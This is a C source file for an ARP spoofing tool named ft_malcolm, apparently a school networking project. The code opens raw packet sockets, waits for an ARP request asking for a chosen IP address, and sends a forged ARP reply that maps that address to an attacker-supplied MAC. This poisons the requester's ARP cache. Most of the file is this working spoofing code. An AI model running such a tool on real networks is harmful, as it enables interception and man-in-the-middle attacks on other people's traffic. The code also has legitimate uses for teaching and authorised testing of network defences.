#include "../include/ft_malcolm.h"

/* Global variable to handle signal interruptions */
int  g_signal_received = 0;

/**
 * @brief Debug function to display ARP packet details
 * @param buffer Pointer to the packet buffer
 * @param len Length of the packet
 */
void dbg_display_arp_packet(const unsigned char *buffer, ssize_t len) {

        // DBG("Packet received, length: %zd bytes\n\n", len);

        EthHdr *eth = (EthHdr *) buffer;
        (void)len;
        if (ntohs(eth->h_proto) == ETH_P_ARP) {

            DBG("=== Ethernet Header ===\n\n");

            char dest_mac[32] = {};
            char src_mac[32] = {};
            mac_addr_byte_to_str(eth->h_dest, dest_mac);
            mac_addr_byte_to_str(eth->h_source, src_mac);

            DBG("\tDestination MAC : %s\n", dest_mac);
            DBG("\tSource MAC      : %s\n", src_mac);
            DBG("\tProtocol (hex)  : 0x%04x\n\n", ntohs(eth->h_proto));
            DBG("Received ARP packet, protocol: 0x%04x\n", ntohs(eth->h_proto));

            EtherArp *arp = (EtherArp *)(buffer + sizeof(EthHdr));
            DBG("=== ARP Header ===\n");
            DBG("\tHardware type   : %u\n", ntohs(arp->ea_hdr.ar_hrd));
            DBG("\tProtocol type   : 0x%04x\n", ntohs(arp->ea_hdr.ar_pro));
            DBG("\tHW size         : %u\n", arp->ea_hdr.ar_hln);
            DBG("\tProtocol size   : %u\n", arp->ea_hdr.ar_pln);
            DBG("\tOpcode          : %u (%s)\n",
                   ntohs(arp->ea_hdr.ar_op),
                   (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) ? "request" :
                   (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY)   ? "reply"   : "other");


            char sender_ip[INET_ADDRSTRLEN];
            char target_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp->arp_spa, sender_ip, sizeof(sender_ip));
            inet_ntop(AF_INET, arp->arp_tpa, target_ip, sizeof(target_ip));


            char s_mac[32] = {};
            char t_mac[32] = {};
            mac_addr_byte_to_str(arp->arp_sha, s_mac);
            mac_addr_byte_to_str(arp->arp_tha, t_mac);

            DBG("\tSender MAC      : %s\n", s_mac);
            DBG("\tSender IP       : %s\n", sender_ip);
            DBG("\tTarget MAC      : %s\n", t_mac);
            DBG("\tTarget IP       : %s\n", target_ip);

            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) {
                DBG("ARP Request: Who has %s? Tell %s\n", target_ip, sender_ip);
            }
        } 
}

/**
 * @brief Check if the ARP request matches the context
 * @param c Pointer to the MalcolmCtx structure containing context information
 * @param arp_spa Sender Protocol Address from the ARP packet
 * @param arp_tpa Target Protocol Address from the ARP packet
 * @return s8 TRUE if the request matches, FALSE otherwise
 */
s8 is_match_request(MalcolmCtx *c, unsigned char *arp_spa, unsigned char *arp_tpa) {
    // if (*(Addr *)arp_spa == c->target_ip && *(Addr *)arp_tpa == c->src_ip &&
    //     ft_strcmp(s_mac, c->target_mac_str) == 0) 
    // set_log_level(L_WARN);

    char *tpa = ft_strdup(inet_ntoa(*(InAddr *)arp_tpa));
    char *spa = ft_strdup(inet_ntoa(*(InAddr *)arp_spa));
    INFO("Received ARP Request: Who has %s? Tell %s\n", tpa, spa);
    free(tpa);
    free(spa);

    if (*(Addr *)arp_tpa == c->src_ip) {
        return (TRUE);
    }
    return (FALSE);
}


/**
 * @brief Initialize the MalcolmSender structure with a raw socket
 * @param sender Pointer to the MalcolmSender structure to initialize
 * @param interface_name Name of the network interface to bind the socket to
 */
void init_malcolm_sender(MalcolmSender *sender, const char* interface_name ) {
    sender->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sender->sock == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    DBG("Successfully opened socket: %i\n", sender->sock);

    u32 ifindex = if_nametoindex(interface_name);
    if (ifindex == 0) {
        perror("if_nametoindex");
        close(sender->sock);
        exit(EXIT_FAILURE);
    }
    DBG("Successfully got interface index: %i\n", ifindex);

    ft_bzero(&sender->addr_ll, sizeof(sender->addr_ll));
    sender->addr_ll.sll_family = AF_PACKET;
    sender->addr_ll.sll_protocol = htons(ETH_P_ALL);
    sender->addr_ll.sll_ifindex = ifindex;
    sender->addr_ll.sll_hatype = ARPHRD_ETHER;
    sender->addr_ll.sll_pkttype = PACKET_OUTGOING;
    sender->addr_ll.sll_halen = ETH_ALEN;
    DBG("Initialized MalcolmSender on device %s\n", interface_name);
}


/**
 * @brief Send a raw ARP reply packet using the provided context
 * @param c Pointer to the MalcolmCtx structure containing context information
 * @return s8 TRUE on success, FALSE on failure
 */
s8 send_raw_packet(MalcolmCtx *c) {

    ft_memcpy(c->sender.addr_ll.sll_addr, c->src_mac, ETH_ALEN);

    errno = 0;
    ssize_t bytes_sent = sendto(c->sender.sock, c->arp_reply_packet, ARP_REPLY_SIZE, 0, (SockAddr*)&c->sender.addr_ll, sizeof(c->sender.addr_ll));
    if (bytes_sent == -1) {
        perror("sendto");
        return (FALSE);
    }
    
    INFO("Packet sent successfully: %zd bytes\n", bytes_sent);
    return (TRUE);
}

/**
 * @brief Build an ARP reply packet based on the provided context
 * @param c Pointer to the MalcolmCtx structure containing context information
 * @param buff Pointer to the buffer where the ARP reply packet will be constructed
 */
void build_packet(MalcolmCtx *c, unsigned char *buff) {
    EthHdr eth_resp;

    ft_memcpy(eth_resp.h_dest, c->target_mac, ETH_ALEN);
    ft_memcpy(eth_resp.h_source, c->src_mac, ETH_ALEN);
    eth_resp.h_proto = htons(ETH_P_ARP);

    EtherArp arp_hdr_resp;
    arp_hdr_resp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr_resp.ea_hdr.ar_pro = htons(ETH_P_IP);
    arp_hdr_resp.ea_hdr.ar_hln = ETH_ALEN;
    arp_hdr_resp.ea_hdr.ar_pln = 4;
    arp_hdr_resp.ea_hdr.ar_op = htons(ARPOP_REPLY);
   
    ft_memcpy(arp_hdr_resp.arp_spa, &c->src_ip, 4);
    ft_memcpy(arp_hdr_resp.arp_tpa, &c->target_ip, 4);
    ft_memcpy(arp_hdr_resp.arp_tha, c->target_mac, ETH_ALEN);
    ft_memcpy(arp_hdr_resp.arp_sha, c->src_mac, ETH_ALEN);


    DBG(YELLOW"=== ARP Reply Packet BUILD ===\n"RESET);
    // unsigned char buff[BUFF_SIZE] = {};
    ft_memcpy(buff, &eth_resp, sizeof(EthHdr));
    ft_memcpy(buff + sizeof(EthHdr), &arp_hdr_resp, sizeof(EtherArp));
    DBG("-----------------------------------------------------------------------------------------------\n");
    dbg_display_arp_packet(buff, sizeof(EthHdr) + sizeof(EtherArp));
    DBG("-----------------------------------------------------------------------------------------------\n");

}

/**
 * @brief Process incoming ARP requests and send replies if they match the context
 * @param c Pointer to the MalcolmCtx structure containing context information
 * @param buffer Pointer to the received packet buffer
 * @param len Length of the received packet
 */
void process_arp_request(MalcolmCtx *c, const unsigned char *buffer, ssize_t len) {

    EthHdr      *eth = (EthHdr *) buffer;
    EtherArp    arp_hdr = *(EtherArp *)(buffer + sizeof(EthHdr));

    if (len < (ssize_t)(sizeof(EthHdr) + sizeof(EtherArp))) {
        DBG("Packet too short to contain ARP header\n");
        return;
    } else if (ntohs(eth->h_proto) != ETH_P_ARP) {
        DBG("Not an ARP packet, protocol: 0x%04x\n", ntohs(eth->h_proto));
        return;
    }

    if (ntohs(arp_hdr.ea_hdr.ar_op) == ARPOP_REQUEST) {
        if (is_match_request(c, arp_hdr.arp_spa, arp_hdr.arp_tpa)) {
            DBG(GREEN"*** Matched ARP packet ***\n\n"RESET);
            DBG(YELLOW"=== SENDING ARP Reply Packet ===\n"RESET);
            if  (!send_raw_packet(c)) {
                ERR("Failed to send ARP reply packet\n");
                exit(1);
            }
            exit(0);
        } else {
            DBG("Src IP: %d, Ctx Src IP: %d\n", *(Addr*)arp_hdr.arp_spa, c->target_ip);
            DBG("Target IP: %d, Ctx Target IP: %d\n", *(Addr*)arp_hdr.arp_tpa, c->src_ip);
            DBG("ARP packet does not match context\n\n");
        }
    }
}

/**
 * @brief Listen for ARP packets and process them
 * @param c Pointer to the MalcolmCtx structure containing context information
 */
void listen_arp(MalcolmCtx *c) {
    char buffer[BUFF_SIZE] = {}; /*Buffer for Ethernet Frame*/


    DBG("Server started, entering initialiation phase...\n");

    errno = 0;
    c->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (c->sock == -1) {
        perror("socket:");
        exit(1);
    }
    DBG("Successfully opened socket: %i\n", c->sock);

    /* Socket timeout */
    struct timeval timeout = {0, 100000}; // 100 milliseconds timeout
    errno = 0;
    if (setsockopt(c->sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
        perror("setsockopt:");
        close(c->sock);
        exit(1);
    }

    INFO("Starting ARP listener...\n");

    while (1) {

        if (g_signal_received) {
            INFO("Signal received, exiting...\n");
            close(c->sock);
            exit(0);
        }

        errno = 0;
        ssize_t length = recvfrom(c->sock, buffer, BUFF_SIZE, 0, NULL, NULL);
        if (length == -1 && errno != EWOULDBLOCK && errno != EINTR) {
            perror("recvfrom:");
            exit(1);
        }
        
        DBG("Received packet of length: %ld\n", length);
        DBG("-----------------------------------------------------------------------------------------------\n");
        dbg_display_arp_packet((unsigned char *)buffer, length);
        DBG("-----------------------------------------------------------------------------------------------\n");

        process_arp_request(c, (unsigned char *)buffer, length);
        ft_bzero(buffer, BUFF_SIZE);
    }
}



/**
 * @brief Parse command-line input arguments and populate the MalcolmCtx structure
 * @param c Pointer to the MalcolmCtx structure to populate
 * @param cli_args Linked list of command-line arguments
 * @return s8 TRUE on success, FALSE on failure
 */
s8 parse_input(MalcolmCtx *c, List *cli_args) {
    void *dst = NULL;
    
    for (int i = 1; i < 5; i++) {
        char *data = cli_args->content;

        DBG("Argument %d: %s\n", i, data);
        if (i == 1 || i == 3) {
            dst = i == 1 ? &c->src_ip : &c->target_ip;
            if (!is_ipv4_addr(data, dst)) {
                ERR("Invalid IPv4 address: (%s)\n", data);
                return (FALSE);
            }
        } else {
            if (!is_mac_addr(data)) {
                ERR("Invalid MAC address: (%s)\n", data);
                return (FALSE);
            }
            dst = i == 2 ? c->src_mac : c->target_mac;
            mac_addr_str_to_bytes(data, dst);
        }
        cli_args = cli_args->next;
    }
    return (TRUE);
}

/* Debug function to display the current context */
void display_ctx(MalcolmCtx *c) {
    char src_ip_str[INET_ADDRSTRLEN];
    char target_ip_str[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, &c->src_ip, src_ip_str, sizeof(src_ip_str));
    inet_ntop(AF_INET, &c->target_ip, target_ip_str, sizeof(target_ip_str));

    INFO("Context:\n");
    INFO("  Source IP   : %s\n", src_ip_str);
    INFO("  Target IP   : %s\n", target_ip_str);
    
    INFO("  Source MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n",
        c->src_mac[0], c->src_mac[1], c->src_mac[2],
        c->src_mac[3], c->src_mac[4], c->src_mac[5]);
        
    INFO("  Target MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n\n",
        c->target_mac[0], c->target_mac[1], c->target_mac[2],
        c->target_mac[3], c->target_mac[4], c->target_mac[5]);
}

/* Main function to run the Malcolm ARP spoofer */
void ft_malcolm(MalcolmCtx *c) {
    char interface_name[BUFF_SIZE] = {};
    s8 ret = get_interface_name(interface_name);
    if (!ret) {
        ERR("Failed to get network interface\n");
        exit(EXIT_FAILURE);
    }

    INFO("Using interface: %s\n", interface_name);
    build_packet(c, c->arp_reply_packet);
    init_malcolm_sender(&c->sender, interface_name);

    listen_arp(c);
}



u32 init_flag_options(int argc, char **argv, s8 *error_flag) {
    FlagContext *flag_c = flag_context_init(argv);
    if (!flag_c) {
        ERR("Memory allocation error\n");
        *error_flag = -1;
        return (0);
    }

    add_flag_option(flag_c, FLAG_HELP_STR, FLAG_HELP, FLAG_HELP_CHAR);

    /*  Init verbose log option */
    add_flag_option(flag_c, FLAG_LOG_VERBOSITY_STR, FLAG_LOG_VERBOSITY, FLAG_LOG_VERBOSITY_CHAR);
    set_flag_option(flag_c, FLAG_LOG_VERBOSITY, EOPT_VALUE_TYPE, CUSTOM_VALUE);
    set_flag_option(flag_c, FLAG_LOG_VERBOSITY, EOPT_MIN_VAL, 1);
    set_flag_option(flag_c, FLAG_LOG_VERBOSITY, EOPT_MAX_VAL, 6);
    set_flag_option(flag_c, FLAG_LOG_VERBOSITY, EOPT_PARSE_FUNC, parse_log_verbosity);
    set_flag_option(flag_c, FLAG_LOG_VERBOSITY, EOPT_MULTIPLE_VAL, VALUE_NO_OVERRID);


    s8 error = 0;
    u32 flag = parse_flag(argc, argv, flag_c, &error);
    if (error == -1) {
        ERR("Error parsing flags\n");
        free_flag_context(flag_c);
        *error_flag = -1;
        return (0);
    }

    display_option_list(*flag_c);
    free_flag_context(flag_c);
    return (flag);
}

void handle_sigint(int sig) {
    (void)sig;
    INFO("Caught SIGINT, exiting...\n");
    g_signal_received = 1;
}

void init_signal_handling(void) {
    struct sigaction sa = {};
    sa.sa_handler = handle_sigint;
    sigaction(SIGINT, &sa, NULL);
}

void usage() {
    printf("%s", MALCOLM_USAGE_STR);
    exit(EXIT_SUCCESS);
}

void init_malcolm(MalcolmCtx *c, int argc, char **argv) {

    List *cli_args = NULL;

    init_signal_handling();

    #ifdef MALCOLM_BONUS
        INFO(GREEN"*** BONUS MODE ENABLED ***\n"RESET);
        s8 error_flag = 0;
        u32 flags = init_flag_options(argc, argv, &error_flag);
        if (error_flag == -1) {
            exit(EXIT_FAILURE);
        } else if (has_flag(flags, FLAG_HELP)) {
            usage();
        }
    #endif

    cli_args = extract_args(argc, argv);
    if (!cli_args) {
        ERR("Failed to extract command line arguments\n");
        exit(EXIT_FAILURE);
    } else if (ft_lstsize(cli_args) != 4) {
        ERR("Invalid number of mandatory arguments. Expected 4, got %d\n", ft_lstsize(cli_args));
        ft_lstclear(&cli_args, free);
        usage();
    } else if (!parse_input(c, cli_args)) {
        ERR("Failed to parse input arguments exit\n");
        ft_lstclear(&cli_args, free);
        exit(EXIT_FAILURE);
    }

    ft_lstclear(&cli_args, free);
    display_ctx(c);
}

int main(int argc, char **argv) {
    
    MalcolmCtx ctx = {0};
    
    set_log_level(L_INFO);


    init_malcolm(&ctx, argc, argv);
    ft_malcolm(&ctx);

    return (0);
}
